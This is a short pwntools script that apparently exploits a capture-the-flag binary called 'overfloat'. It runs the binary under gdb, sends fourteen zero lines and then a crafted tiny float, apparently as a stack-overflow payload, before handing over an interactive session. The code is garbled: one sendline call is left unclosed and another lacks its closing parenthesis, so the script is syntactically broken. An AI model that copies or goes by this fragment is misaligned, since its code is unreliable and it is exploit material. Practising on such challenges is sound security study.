from pwn import * 

target = gdb.debug("./overfloat")
for i in range(14):
	target.sendline(b"0")
target.sendline(
target.sendline(b"0.000000000000000000000000000000000000005879826"
target.interactive()